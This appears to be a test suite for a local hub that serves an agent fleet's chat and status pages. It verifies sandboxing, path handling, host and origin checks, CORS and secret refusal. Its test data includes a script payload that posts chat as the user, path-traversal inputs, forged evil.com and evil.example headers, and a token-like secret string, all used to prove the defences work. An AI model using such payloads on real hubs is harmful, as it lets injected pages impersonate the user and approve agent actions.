    expect(png.headers.get("Content-Security-Policy") ?? "").toStartWith("sandbox allow-scripts");
    expect((await fetch(`http://127.0.0.1:${port}/f/p/decisions/d2.svg`)).headers.get("Content-Type") ?? "").toStartWith("image/svg+xml");
  });

  test("every other file of the fleet's DIR is served with no origin and no script, never sniffed, whatever its type or path", async () => {
    mkdirSync(join(root, "notes"), { recursive: true });
    const hostile = "<script>fetch('chat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{\"text\": \"x\"}' })</script>";
    writeFileSync(join(root, "evil.html"), hostile);
    writeFileSync(join(root, "notes", "evil.html"), hostile);
    writeFileSync(join(root, "notes", "evil.svg"), `<svg xmlns="http://www.w3.org/2000/svg">${hostile}</svg>`);
    writeFileSync(join(root, "notes", "evil.xhtml"), `<html xmlns="http://www.w3.org/1999/xhtml">${hostile}</html>`);
    writeFileSync(join(root, "notes", "noext"), hostile);
    writeFileSync(join(root, "notes", "shot.png"), Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64"));

    for (const path of ["/f/p/evil.html", "/f/p/notes/evil.html", "/f/p/notes//evil.html", "/f/p/notes%2Fevil.html", "/f/p/notes/evil.svg", "/f/p/notes/evil.xhtml", "/f/p/notes/noext", "/f/p/notes/shot.png", "/f/p/Notes/../notes/evil.html"]) {
      for (const method of ["GET", "HEAD"]) {
        const res = await fetch(`http://127.0.0.1:${port}${path}`, { method });
        expect([path, method, res.status, res.headers.get("Content-Security-Policy"), res.headers.get("X-Content-Type-Options")]).toEqual([
          path,
          method,
          200,
          "sandbox; script-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'",
          "nosniff",
        ]);
      }
    }

    expect((await fetch(`http://127.0.0.1:${port}/f/p/notes/shot.png`)).headers.get("Content-Type")).toBe("image/png");
    expect(await (await fetch(`http://127.0.0.1:${port}/f/p/evil.html`)).text()).toBe(hostile);
  });

  test("the page is rendered with the hub's origin; an index.html an agent left in DIR, served when the page cannot be, is sandboxed", async () => {
    writeFileSync(join(root, "index.html"), "<script>window.agent = true</script>");

    for (const path of ["/f/p/", "/f/p/index.html"]) {
      const res = await fetch(`http://127.0.0.1:${port}${path}`);
      const html = await res.text();
      expect([path, res.headers.get("Content-Type"), res.headers.get("Content-Security-Policy"), html.includes('<script id="fleet-core">')]).toEqual([path, "text/html; charset=utf-8", null, true]);
    }

    for (const path of ["/f/p/state.json", "/f/p/chat", "/f/p/skills"]) {
      const res = await fetch(`http://127.0.0.1:${port}${path}`);
      expect([path, res.status, res.headers.get("Content-Type")?.startsWith("application/json")]).toEqual([path, 200, true]);
    }

    writeFileSync(join(root, "state.json"), "{ torn");
    const fallback = await fetch(`http://127.0.0.1:${port}/f/p/`);
    expect([await fallback.text(), fallback.headers.get("Content-Security-Policy")?.startsWith("sandbox; script-src 'none'")]).toEqual(["<script>window.agent = true</script>", true]);
  });

  test("nothing outside the fleet's directory is served", async () => {
    writeFileSync(join(base, "p", "secret.txt"), "no");

    for (const path of ["/f/p/../secret.txt", "/f/p/%2e%2e/secret.txt", "/f/p/.hidden"]) {
      expect((await fetch(`http://127.0.0.1:${port}${path}`)).status).toBe(404);
    }
  });
});

describe("the live stream", () => {
  beforeEach(() => start());

  test("hello, then the state on connect, with the stream's headers", async () => {
    const stream = await Stream.open("/f/p/events");
    expect(stream.response.headers.get("Content-Type")).toBe("text/event-stream");
    expect(stream.response.headers.get("Cache-Control")).toBe("no-store");
    expect(stream.response.headers.get("X-Accel-Buffering")).toBe("no");
    const first = await stream.next();
    const state = await stream.next();
    expect([first["event"], data(first)["write"], first["id"]]).toEqual(["hello", true, undefined]);
    expect([state["event"], state["id"]]).toEqual(["state", undefined]);
    expect((asArray(data(state)["agents"]) ?? []).map((a) => asObject(a)?.["id"])).toEqual(["a1", "a2"]);
    stream.close();
  });

  test("a replay after Last-Event-ID, then a message posted on the page", async () => {
    for (const text of ["one", "two", "three"]) say("user", text);
    const stream = await Stream.open("/f/p/events", { "Last-Event-ID": "1" });
    const replayed = [await stream.nextOf("chat"), await stream.nextOf("chat")];
    expect(replayed.map((e) => [e["id"], data(e)["text"]])).toEqual([
      ["2", "two"],
      ["3", "three"],
    ]);
    await post({ text: "@a1 four" });
    const live = await stream.nextOf("chat");
    expect([live["id"], data(live)["to"]]).toEqual(["4", ["a1"]]);
    stream.close();
  });

  test("?after is the resume point without the header", async () => {
    say("user", "one");
    say("user", "two");
    const stream = await Stream.open("/f/p/events?after=1");
    expect((await stream.nextOf("chat"))["id"]).toBe("2");
    stream.close();
  });

  test("a change to the ledger is a state event", async () => {
    const stream = await Stream.open("/f/p/events");
    await stream.next();
    await stream.next();
    fleet(["state", root, "set", "--now", "landing the adapter", "--no-render"], env);
    const event = await stream.nextOf("state");
    expect(data(event)["now"]).toBe("landing the adapter");
    stream.close();
  });

  test("a torn line in the store does not stop the stream or the posts", async () => {
    say("a1", "one");
    const stream = await Stream.open("/f/p/events", { "Last-Event-ID": "1" });
    await stream.next();
    writeFileSync(join(root, "chat.jsonl"), Buffer.concat([readFileSync(join(root, "chat.jsonl")), Buffer.from('{"id": 2, "text": "'), Buffer.from([0xff])]));
    const sent = await post({ text: "@a1 two" });
    expect([sent.status, sent.body["id"]]).toEqual([201, 2]);
    expect((await stream.nextOf("chat"))["id"]).toBe("2");
    stream.close();
  });

  test("clients that leave leave the hub serving", async () => {
    for (let i = 0; i < 3; i += 1) {
      const stream = await Stream.open("/f/p/events");
      await stream.next();
      stream.close();
    }

    say("user", "after the drop");
    expect((await request("GET", "/f/p/chat")).status).toBe(200);
  });
});

describe("preview", () => {
  beforeEach(() => start());

  function preview(payload: string | JsonObject, headers: Record<string, string> = {}): Promise<Answer> {
    return post(payload, headers, "/f/p/chat/preview");
  }

  test("answers whom a text would reach and stores nothing", async () => {
    say("a1", "done?");
    const before = readFileSync(join(root, "chat.jsonl"));
    const got = await preview({ text: "@a2. and you", re: 1 });
    expect([got.status, got.body]).toEqual([200, { to: ["a2", "a1"], parts: [{ text: "@a2", mention: "a2" }, { text: ". and you" }] }]);
    expect((await preview({ text: "" })).body).toEqual({ to: ["coordinator"], parts: [] });
    expect((await preview({ text: "", re: 1 })).body).toEqual({ to: ["a1"], parts: [] });
    expect(readFileSync(join(root, "chat.jsonl")).equals(before)).toBe(true);
  });

  test("is refused as a post is", async () => {
    say("a1", "one");

    const cases: (readonly [number, Answer])[] = [
      [421, await preview({ text: "hi" }, { Host: "evil.com" })],
      [415, await request("POST", "/f/p/chat/preview", '{"text": "hi"}', { "Content-Type": "text/plain" })],
      [403, await preview({ text: "hi" }, { Origin: "https://evil.example" })],
      [413, await preview({ text: "x".repeat(300_000) })],
      [400, await preview({ text: "hi", re: 9 })],
      [400, await preview("not json")],
    ];

    for (const [status, answer] of cases) expect(answer.status).toBe(status);
    expect(readChat(root).length).toBe(1);
  });

  test("every shared recipient case of the user's", async () => {
    const groups = asArray(JSON.parse(readFileSync(join(import.meta.dir, "../../skills/productivity/coordinator/tests/recipients.json"), "utf8"))) ?? [];

    for (const group of groups) {
      for (const raw of asArray(asObject(group)?.["cases"]) ?? []) {
        const c = asObject(raw) ?? {};

        if (c["sender"] !== "user") continue;
        writeFileSync(join(root, "state.json"), JSON.stringify(asObject(group)?.["roster"]));
        writeFileSync(join(root, "chat.jsonl"), "");
        const reSender = asString(c["re_sender"]);
        const re = reSender === undefined ? null : say(reSender, "earlier");
        const more = Object.fromEntries(["marks", "quote", "side"].flatMap((k) => (c[k] === undefined ? [] : [[k, c[k] ?? null]])));
        const got = await preview({ text: asString(c["text"]) ?? "", re, ...more });
        expect([got.status, got.body["to"]]).toEqual([200, c["to"]]);

        if (c["parts"] !== undefined) expect(got.body["parts"]).toEqual(c["parts"]);
      }
    }
  });
});

describe("the skills a fleet's session can run", () => {
  let config: string;

  let repo: string;

  function skillFile(dir: string, lines: readonly string[]): void {
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, dir.endsWith("commands") ? "" : "SKILL.md"), ["---", ...lines, "---", "", "The body is never read."].join("\n"));
  }

  function file(path: string, text: string): void {
    mkdirSync(join(path, ".."), { recursive: true });
    writeFileSync(path, text);
  }

  function plugin(dir: string, name: string): string {
    file(join(dir, ".claude-plugin", "plugin.json"), JSON.stringify({ name }));

    return dir;
  }

  beforeEach(() => {
    config = join(base, "home", ".claude");
    repo = join(base, "repo");
    env = { ...env, HOME: join(base, "home"), CLAUDE_CONFIG_DIR: config };
    const good = plugin(join(base, "cache", "good"), "good");
    const off = plugin(join(base, "cache", "off"), "off");
    const otherTstack = plugin(join(base, "cache", "tstack"), "tstack");
    const elsewhere = plugin(join(base, "cache", "elsewhere"), "elsewhere");
    skillFile(join(good, "skills", "lint"), ["name: lint", "description: >", "  Lint the code,", "  every file.", 'argument-hint: "[path]"']);
    skillFile(join(good, "skills", "hidden"), ["description: only the model runs it", "user-invocable: false"]);
    file(join(good, "commands", "ship.md"), "---\ndescription: 'Ship it, don''t wait'\ndisable-model-invocation: true\n---\nbody\n");
    skillFile(join(off, "skills", "x"), ["description: disabled"]);
    skillFile(join(otherTstack, "skills", "tdd"), ["description: an older tstack"]);
    skillFile(join(elsewhere, "skills", "y"), ["description: another project's"]);

    const installs = {
      "good@mk": [{ scope: "user", installPath: good }],
      "off@mk": [{ scope: "user", installPath: off }],
      "tstack@tstack": [{ scope: "user", installPath: otherTstack }],
      "elsewhere@mk": [{ scope: "project", projectPath: join(base, "other-repo"), installPath: elsewhere }],
    };

    file(join(config, "plugins", "installed_plugins.json"), JSON.stringify({ version: 2, plugins: installs }));
    file(join(config, "settings.json"), JSON.stringify({ enabledPlugins: { "good@mk": true, "off@mk": false } }));
    skillFile(join(config, "skills", "notes"), ["name: notes", "description: |", "  Keep notes.", "  Two lines."]);
    skillFile(join(config, "skills", "shared"), ["description: the user's"]);
    mkdirSync(join(repo, ".jj"), { recursive: true });
    skillFile(join(repo, ".claude", "skills", "deploy"), ["description: Deploy the app", "disable-model-invocation: true", "allowed-tools:", "  - Bash"]);
    skillFile(join(repo, ".claude", "skills", "shared"), ["description: the project's"]);
  });

  function byName(body: JsonObject): Map<string, JsonObject> {
    return new Map((asArray(body["skills"]) ?? []).map((s) => [asString(asObject(s)?.["name"]) ?? "", asObject(s) ?? {}]));
  }

  test("lists this plugin's, the enabled plugins', the user's and the project's, sorted, each once", async () => {
    const dir = join(base, "-repo", "abc", "scratchpad", "coordinator");
    mkdirSync(dir, { recursive: true });
    writeState(dir, [], { project: "s" });
    file(join(config, "projects", "-repo", "abc.jsonl"), `${JSON.stringify({ type: "mode" })}\n${JSON.stringify({ type: "user", cwd: repo })}\n`);
    register(dir, "s");
    await start();
    const got = await request("GET", "/f/s/skills");
    expect([got.status, got.headers.get("Content-Type"), got.body["builtins"]]).toEqual([200, "application/json; charset=utf-8", false]);
    const skills = byName(got.body);
    const names = [...skills.keys()];
    expect(names).toEqual([...names].sort());
    expect(skills.get("good:lint")).toEqual({ name: "good:lint", description: "Lint the code, every file.", hint: "[path]", source: "plugin", model: true });
    expect(skills.get("good:ship")).toEqual({ name: "good:ship", description: "Ship it, don't wait", hint: "", source: "plugin", model: false });
    expect(skills.get("notes")).toEqual({ name: "notes", description: "Keep notes.\nTwo lines.", hint: "", source: "user", model: true });
    expect(skills.get("deploy")).toEqual({ name: "deploy", description: "Deploy the app", hint: "", source: "project", model: false });
    expect([skills.get("shared")?.["description"], skills.get("shared")?.["source"]]).toEqual(["the user's", "user"]);
    expect(skills.get("tstack:tdd")?.["source"]).toBe("plugin");
    expect(asString(skills.get("tstack:tdd")?.["description"])).toStartWith("Test-first");
    expect(names.filter((n) => n === "tstack:tdd").length).toBe(1);

    for (const gone of ["good:hidden", "off:x", "elsewhere:y"]) expect(skills.has(gone)).toBe(false);
  });

  test("without a transcript the ledger's workspace names the repository; the list is held for a minute", async () => {
    writeState(root, [], { workspaces: [{ id: "w1", agent: "a1", path: join(base, "repo-w1"), repo, status: "active" }] });
    await start();
    const first = await request("GET", "/f/p/skills");
    expect(byName(first.body).get("deploy")?.["source"]).toBe("project");
    skillFile(join(config, "skills", "later"), ["description: added after"]);
    expect(await request("GET", "/f/p/skills")).toMatchObject({ status: 200, body: first.body });
  });

  test("a fleet whose repository nothing records lists no project skills, and an unknown fleet is a 404", async () => {
    await start();
    const skills = byName((await request("GET", "/f/p/skills")).body);
    expect([skills.has("deploy"), skills.get("shared")?.["source"], skills.has("good:lint")]).toEqual([false, "user", true]);
    expect((await request("GET", "/f/nobody/skills")).status).toBe(404);
  });

  test("the frontmatter's scalars: plain, quoted, folded and literal; lists and the body are skipped", () => {
    const text = ["---", "name: a", 'description: "say \\"hi\\""', "hint: >-", "  one", "  two", "", "  three", "tools:", "  - Bash", "plain: x # note", "---", "body: no"].join("\n");
    expect(Object.fromEntries(frontmatter(text))).toEqual({ name: "a", description: 'say "hi"', hint: "one two\nthree", plain: "x" });
    expect(frontmatter("no frontmatter\nname: x").size).toBe(0);
  });
});

describe("hosts and origins", () => {
  beforeEach(() => start());

  test("a foreign Host is refused on every route", async () => {
    const evil = { Host: "evil.com" };

    for (const path of ["/", "/events", "/api/fleets", "/f/p/", "/f/p/state.json", "/f/p/events", "/f/p/chat"]) {
      const got = await request("GET", path, undefined, evil);
      expect([path, got.status, got.body]).toEqual([path, 421, { error: "unknown host" }]);
    }

    expect((await post({ text: "hi" }, evil)).status).toBe(421);
    expect((await post({ text: "hi" }, { Host: "evil.com", Origin: "http://evil.com" })).status).toBe(421);
    expect(readChat(root)).toEqual([]);
  });

  test("the https name tailscale serve gives it is still answered after the tailnet is read again", async () => {
    await running?.stop();
    const fake = join(base, "tailscale");
    writeFileSync(fake, FAKE_TAILSCALE.replace('  *) exit 1 ;;', '  "serve --bg") exit 0 ;;\n  *) exit 1 ;;'));
    chmodSync(fake, 0o755);
    port = freePort();
    const got = await startHub({ port, machine: machine(env), tailscale: fake, peers: false, hosts: [], https: 7443 }, () => {});

    if (got instanceof Error) throw got;
    running = got;
    expect(running.url).toBe("https://box.tail.ts.net:7443/");
    const https = { Host: "box.tail.ts.net:7443" };
    expect((await request("GET", "/api/fleets", undefined, https)).status).toBe(200);
    await running.hub.refresh();
    expect((await request("GET", "/api/fleets", undefined, https)).status).toBe(200);
  });

  test("localhost is allowed", async () => {
    expect((await post({ text: "hi" }, { Host: `localhost:${port}`, Origin: `http://localhost:${port}` })).status).toBe(201);
  });

  test("an origin must be http or https on a name the hub answers to", async () => {
    for (const origin of [`ftp://127.0.0.1:${port}`, `http://localhost:${port + 1}`, "null"]) {
      expect((await post({ text: "hi" }, { Origin: origin })).status).toBe(403);
    }
  });
});

describe("a prototype page posting from an origin the hub's config allows", () => {
  const PAGE = "https://box.tail.ts.net:7501";
  const OTHER = "https://box.tail.ts.net:7502";

  const allow = (origins: readonly string[]): void => {
    mkdirSync(join(home, "hub"), { recursive: true });
    writeFileSync(chatOriginsPath(home), JSON.stringify({ chat_origins: origins }));
  };

  const cors = (answer: Answer): readonly (string | null)[] => [answer.headers.get("Access-Control-Allow-Origin"), answer.headers.get("Access-Control-Allow-Credentials")];

  beforeEach(async () => {
    const decisions = [{ id: "d1", kind: "decision", title: "Invoice schema", question: "q", status: "open", resolution: null, opened: "2026-01-01T00:00:00+00:00" }];
    writeState(root, [{ id: "a1", name: "notes-impl" }], { decisions });
    allow([PAGE, "https://box.tail.ts.net:7504"]);
    await start();
  });

  test("the preflight from an allowed origin is a 204 naming that origin, with credentials, POST and content-type", async () => {
    const got = await request("OPTIONS", "/f/p/chat", undefined, { Origin: PAGE, "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "content-type" });
    expect(got.status).toBe(204);
    expect(cors(got)).toEqual([PAGE, "true"]);
    expect([got.headers.get("Access-Control-Allow-Methods"), got.headers.get("Access-Control-Allow-Headers"), got.headers.get("Access-Control-Max-Age")]).toEqual(["POST", "content-type", "600"]);
    expect(got.headers.get("Vary")).toContain("Origin");
  });

  test("the preflight from any other origin, or to another route, carries no CORS headers", async () => {
    for (const [path, origin] of [["/f/p/chat", OTHER], ["/f/p/chat", "null"], ["/f/p/chat", "http://box.tail.ts.net:7501"], ["/f/p/name", PAGE], ["/f/p/chat/preview", PAGE], ["/f/p/preview-workers", PAGE]] as const) {
      const got = await request("OPTIONS", path, undefined, { Origin: origin, "Access-Control-Request-Method": "POST" });
      expect([path, origin, got.status >= 400, ...cors(got)]).toEqual([path, origin, true, null, null]);
    }
  });

  test("a post from an allowed origin is the user's message, as typed, with the origin it came from, and the stream carries it", async () => {
    const stream = await Stream.open("/f/p/events");
    const sent = await post({ text: "/tstack:tdd fix the parser" }, { Origin: PAGE, "Sec-Fetch-Site": "same-site" });
    expect([sent.status, sent.body["from"], sent.body["to"], sent.body["text"], sent.body["origin"]]).toEqual([201, "user", ["coordinator"], "/tstack:tdd fix the parser", PAGE]);
    expect(cors(sent)).toEqual([PAGE, "true"]);
    expect(sent.headers.get("Vary")).toContain("Origin");
    expect(readChat(root).map((m) => m.stored)).toEqual([sent.body]);
    expect(data(await stream.nextOf("chat"))).toEqual(sent.body);
    stream.close();
  });

  test("a reply, a quote and a side chat go through too", async () => {
    const first = await post({ text: "first", side: "new" }, { Origin: PAGE });
    const quote = { text: "per line", from: "Rounding" };
    const next = await post({ text: "and this", re: first.body["id"] ?? null, quote, side: first.body["side"] ?? null }, { Origin: PAGE });
    expect([next.status, next.body["re"], next.body["quote"], next.body["side"], next.body["origin"]]).toEqual([201, 1, quote, 1, PAGE]);
  });

  test("an origin the config does not list is refused, and nothing is stored", async () => {
    for (const origin of [OTHER, "https://box.tail.ts.net:7501/", "https://evil.example", "http://box.tail.ts.net:7501"]) {
      const got = await post({ text: "hi" }, { Origin: origin });
      expect([origin, got.status, ...cors(got)]).toEqual([origin, 403, null, null]);
    }

    expect(readChat(root)).toEqual([]);
  });

  test("a cross-site post with no Origin, or a null one, is refused", async () => {
    for (const headers of [{ "Sec-Fetch-Site": "same-site" }, { "Sec-Fetch-Site": "cross-site" }, { Origin: "null" }, { Origin: "null", "Sec-Fetch-Site": "cross-site" }]) {
      const got = await post({ text: "hi" }, headers);
      expect([headers, got.status, ...cors(got)]).toEqual([headers, 403, null, null]);
    }

    expect(readChat(root)).toEqual([]);
  });

  test("an answer to a decision, or a grant's rule, is the fleet's own page's: refused from another origin, with the CORS headers", async () => {
    for (const payload of [{ text: "B: keep both", decision: "d1" }, { text: "Allow once", rule: "Bash(ls)" }]) {
      const got = await post(payload, { Origin: PAGE });
      expect([got.status, asString(got.body["error"])?.includes("own page"), ...cors(got)]).toEqual([403, true, PAGE, "true"]);
    }

    expect(readChat(root)).toEqual([]);
    expect((await post({ text: "B: keep both", decision: "d1" })).status).toBe(201);
  });

  test("the hub's refusals reach the page with the CORS headers: a bad body, too big, not JSON", async () => {
    const cases: (readonly [number, Answer])[] = [
      [400, await post({ text: "  " }, { Origin: PAGE })],
      [413, await post({ text: "x".repeat(300_000) }, { Origin: PAGE })],
      [415, await request("POST", "/f/p/chat", '{"text": "hi"}', { "Content-Type": "text/plain", Origin: PAGE })],
    ];

    for (const [status, got] of cases) expect([got.status, ...cors(got)]).toEqual([status, PAGE, "true"]);
  });

  test("a sandboxed page's post (Origin null), or one the browser says is not same-origin, is refused on every route that acts as the user", async () => {
    const routes: readonly (readonly [string, JsonObject])[] = [
      ["/f/p/chat", { text: "hi" }],
      ["/f/p/chat", { text: "B: keep both", decision: "d1" }],
      ["/f/p/chat", { text: "Allow once", rule: "Bash(ls)" }],
      ["/f/p/chat/preview", { text: "hi" }],
      ["/f/p/name", { agent: "a1", name: "Writer" }],
      ["/f/p/preview-workers", { worker: "a1", include: true }],
      ["/f/p/orphans/stop", { pid: 4242, started: 1 }],
      ["/f/p/onepw/unlocked", {}],
      ["/f/p/wake", {}],
    ];

    const self = `http://127.0.0.1:${port}`;

    const hostile: readonly Record<string, string>[] = [
      { Origin: "null" },
      { Origin: "null", "Sec-Fetch-Site": "cross-site" },
      { Origin: self, "Sec-Fetch-Site": "cross-site" },
      { Origin: self, "Sec-Fetch-Site": "same-site" },
      { Origin: self, "Sec-Fetch-Site": "none" },
      { "Sec-Fetch-Site": "none" },
      { Origin: OTHER, "Sec-Fetch-Site": "same-site" },
      { Origin: "null", "Sec-Fetch-Site": "same-origin" },
    ];

    for (const [path, payload] of routes) {
      for (const headers of hostile) {
        const got = await post(payload, headers, path);
        expect([path, payload, headers, got.status, asString(got.body["error"])]).toEqual([path, payload, headers, 403, "cross-origin post refused"]);
      }
    }

    expect(readChat(root)).toEqual([]);
    const own = await post({ text: "from the page" }, { Origin: self, "Sec-Fetch-Site": "same-origin" });
    expect(own.status).toBe(201);
    expect((await post({ agent: "a1", name: "Writer" }, { Origin: self, "Sec-Fetch-Site": "same-origin" }, "/f/p/name")).status).toBe(200);
  });

  test("every other post stays same-origin", async () => {
    expect((await post({ agent: "a1", name: "Writer" }, { Origin: PAGE }, "/f/p/name")).status).toBe(403);
    expect((await post({ text: "hi" }, { Origin: PAGE }, "/f/p/chat/preview")).status).toBe(403);
    expect((await post({ worker: "a1", include: true }, { Origin: PAGE }, "/f/p/preview-workers")).status).toBe(403);
  });

  test("the same-origin post is as before: no CORS headers and no origin on the message", async () => {
    const sent = await post({ text: "hi" }, { Origin: `http://127.0.0.1:${port}` });
    expect([sent.status, sent.body["origin"], ...cors(sent)]).toEqual([201, undefined, null, null]);
    const bare = await post({ text: "from a terminal" });
    expect([bare.status, bare.body["origin"]]).toEqual([201, undefined]);
  });

  test("the list is read on each request: emptied, the origin is refused as before", async () => {
    allow([]);
    expect((await post({ text: "hi" }, { Origin: PAGE })).status).toBe(403);
    rmSync(chatOriginsPath(home));
    expect((await post({ text: "hi" }, { Origin: PAGE })).status).toBe(403);
    allow([PAGE]);
    expect((await post({ text: "hi" }, { Origin: PAGE })).status).toBe(201);
  });

  test("the config keeps exact http(s) origins only: no wildcard, path, default port, user or other scheme", () => {
    const text = JSON.stringify({
      chat_origins: [PAGE, "https://*.tail.ts.net", "https://box.tail.ts.net:7504/", "https://box.tail.ts.net:443", "https://u@box.tail.ts.net:7505", "ftp://box.tail.ts.net:21", "null", "*", 7, "HTTPS://Box.tail.ts.net:7512"],
    });

    expect([...parseChatOrigins(text)]).toEqual([PAGE]);
    expect([...parseChatOrigins("not json")]).toEqual([]);
    expect([...parseChatOrigins(undefined)]).toEqual([]);
    expect([...parseChatOrigins(JSON.stringify({ chat_origins: "https://box.tail.ts.net:7501" }))]).toEqual([]);
  });

  test("as the signed-in user: the owner's login is the author; anyone else is refused, with the CORS headers", async () => {
    await running?.stop();
    const fake = join(base, "tailscale");
    writeFileSync(fake, FAKE_TAILSCALE);
    chmodSync(fake, 0o755);
    await start({ tailscale: fake });
    const me = await post({ text: "hi" }, { Origin: PAGE, "Tailscale-User-Login": OWNER });
    expect([me.status, me.body["author"], me.body["origin"]]).toEqual([201, OWNER, PAGE]);
    const eve = await post({ text: "hi" }, { Origin: PAGE, "Tailscale-User-Login": "eve@example.com" });
    expect([eve.status, eve.body, ...cors(eve)]).toEqual([403, { error: `only ${OWNER} can write here` }, PAGE, "true"]);
  });
});

describe("the Mac's process readings (ps and lsof, no /proc)", () => {
  test("lsof -F pn: each pid's open names, in order", () => {
    const text = "p12\nfcwd\nn/Users/u/repo\np34\nf5\nn127.0.0.1:7420\nf8\nn100.91.33.44:7420\n";
    expect([...lsofFiles(text)]).toEqual([
      [12, ["/Users/u/repo"]],
      [34, ["127.0.0.1:7420", "100.91.33.44:7420"]],
    ]);
  });

  test("listening ports from lsof, the first pid on each", () => {
    const text = "p34\nf5\nn127.0.0.1:7420\nf8\nn[::1]:7420\np56\nf3\nn*:8080\n";
    expect([...lsofListenersOf(text)]).toEqual([
      [7420, 34],
      [8080, 56],
    ]);
  });

  test("ps etime in seconds", () => {
    expect([elapsedOf("00:07"), elapsedOf("01:02:03"), elapsedOf(" 2-00:00:01\n"), elapsedOf("")]).toEqual([7, 3723, 172801, Number.NaN]);
  });

  test("ps pid ppid: each pid's parent", () => {
    expect([...parentsOf("    1     0\n  412     1\n\n")]).toEqual([
      [1, 0],
      [412, 1],
    ]);
  });

  test("a Claude Code process: named claude, or running a binary from Claude's versions directory, whose name is the version", () => {
    expect([
      isClaudeBinary("claude", "/home/u/.local/share/claude/versions/2.1.287"),
      isClaudeBinary("2.1.287", "/home/u/.local/share/claude/versions/2.1.287"),
      isClaudeBinary("2.1.287", "/Users/u/.local/share/claude/versions/2.1.287"),
      isClaudeBinary("zsh", "/etc/profiles/per-user/u/bin/zsh"),
      isClaudeBinary("bun", "/nix/store/x-bun-1.4.2/bin/bun"),
      isClaudeBinary("2.1.287", ""),
    ]).toEqual([true, true, true, false, false, false]);
  });
});

describe("answers to decisions", () => {
  beforeEach(async () => {
    const decisions = [
      { id: "d1", kind: "decision", title: "Invoice schema", question: "q", status: "open", resolution: null, opened: "2026-01-01T00:00:00+00:00" },
      { id: "d2", kind: "decision", title: "Invoice schema", question: "q", status: "withdrawn", resolution: "found in the docs", opened: "2026-01-01T00:00:00+00:00" },
      { id: "d3", kind: "secret", title: "Neo4j password", question: "q", status: "open", resolution: null, opened: "2026-01-01T00:00:00+00:00" },
    ];

    writeState(root, [{ id: "a1", name: "notes-impl" }], { decisions });
    await start();
  });

  test("an answer to an open decision is stored with its tag", async () => {
    const sent = await post({ text: "B: keep both", decision: "d1" });
    expect([sent.status, sent.body["decision"], sent.body["to"]]).toEqual([201, "d1", ["coordinator"]]);
  });

  test("an answer that cannot be taken is refused with the reason and not stored", async () => {
    const cases = [
      [400, "unknown decision", { text: "A", decision: "d9" }],
      [409, "found in the docs", { text: "A", decision: "d2" }],
      [400, "never the value", { text: "ghp_16C7e42F292c6912E7710c838347Ae178B4a", decision: "d3" }],
      [400, "decision", { text: "A", decision: 3 }],
    ] as const;

    for (const [status, word, payload] of cases) {
      const got = await post(payload);
      expect(got.status).toBe(status);
      expect(asString(got.body["error"])).toContain(word);
    }

    expect(readChat(root)).toEqual([]);
  });

  test("a secret given as a reference is stored", async () => {
    const sent = await post({ text: "op://Engineering/Neo4j Aura/password", decision: "d3" });
    expect([sent.status, sent.body["decision"]]).toEqual([201, "d3"]);
  });

  const pending = (id = "d1", hash = `#decision/${id}`): JsonObject => ({
    decision: { id, title: "Invoice schema", revision: "2026-01-01T00:00:00+00:00" },
    at: { hash },
    items: [{ n: 1, kind: "general", comment: "name the fields" }],
  });

  test("the decision's pending marks ride along with its answer: the batch, then the answer, in one write", async () => {
    const sent = await post({ text: "B: keep both", decision: "d1", batch: { text: "1 mark on d1, @a1 too", marks: pending() } });
    expect([sent.status, sent.body["id"], sent.body["decision"], sent.body["to"]]).toEqual([201, 2, "d1", ["coordinator"]]);
    const batch = asObject(sent.body["batch"]);
    expect([batch?.["id"], batch?.["from"], batch?.["to"], batch?.["text"], batch?.["marks"], batch?.["decision"]]).toEqual([1, "user", ["coordinator", "a1"], "1 mark on d1, @a1 too", pending(), undefined]);
    expect(readChat(root).map((m) => m.stored)).toEqual([batch, { ...sent.body, batch: undefined }].map((o) => JSON.parse(JSON.stringify(o))));
    const plain = await post({ text: "A", decision: "d1" });
    expect([plain.status, plain.body["batch"]]).toEqual([201, undefined]);
  });

  test("a batch that cannot ride along is a 400, and neither it nor the answer is stored", async () => {
    const cases: JsonObject[] = [
      { text: "A", decision: "d1", batch: "1 mark" },
      { text: "A", decision: "d1", batch: { text: "1 mark" } },
      { text: "A", decision: "d1", batch: { text: "1 mark", marks: { ...pending(), items: [] } } },
      { text: "A", decision: "d1", batch: { text: " ", marks: pending() } },
      { text: "A", decision: "d1", batch: { text: "1 mark", marks: pending("d3") } },
      { text: "A", batch: { text: "1 mark", marks: pending() } },
    ];

    for (const payload of cases) {
      const got = await post(payload);
      expect([got.status, asString(got.body["error"]) !== undefined]).toEqual([400, true]);
    }

    expect(asString((await post(cases[4] ?? {})).body["error"])).toBe("the batch's marks are on decision d3, not on d1, the one answered");
    expect(readChat(root)).toEqual([]);
  });

  test("a ride-along batch may go in its decision's page thread, and in no other side chat", async () => {
    const opener = await post({ text: "1 mark on d1", marks: pending() });
    const sent = await post({ text: "B", decision: "d1", batch: { text: "1 more", marks: pending(), side: opener.body["id"] ?? null } });
    expect([sent.status, asObject(sent.body["batch"])?.["side"], sent.body["side"]]).toEqual([201, 1, undefined]);
    const loose = await post({ text: "why?", side: "new", quote: { text: "x", at: { hash: "#plan" } } });
    const refused = await post({ text: "A", decision: "d1", batch: { text: "1 more", marks: pending(), side: loose.body["id"] ?? null } });
    expect([refused.status, refused.body["error"]]).toEqual([400, "a batch of marks is a message of its own: no decision, quote or side chat with it"]);
    expect(readChat(root).length).toBe(4);
  });

  test("the batch that rides along with an answer is the owner's", async () => {
    const other = await post({ text: "B", decision: "d1", batch: { text: "1 mark for @a1", marks: { ...pending(), to: "a1" } } });
    expect([other.status, other.body["error"]]).toEqual([400, "the batch that rides along with an answer is the decision owner's (coordinator)"]);
    expect(readChat(root)).toEqual([]);
    const own = await post({ text: "B", decision: "d1", batch: { text: "1 mark", marks: { ...pending(), to: "coordinator" } } });
    expect([own.status, asObject(own.body["batch"])?.["to"]]).toEqual([201, ["coordinator"]]);
  });

  test("an answer the store refuses stores neither it nor its batch, and says no batch was stored", async () => {
    const got = await post({ text: "B", decision: "d1", side: 99, batch: { text: "1 mark", marks: pending() } });
    expect([got.status, got.body]).toEqual([400, { error: "no side chat #99" }]);
    expect(readChat(root)).toEqual([]);
  });
});

describe("who may write", () => {
  test("without Tailscale this machine writes, and the chat says nothing of a login", async () => {
    await start();
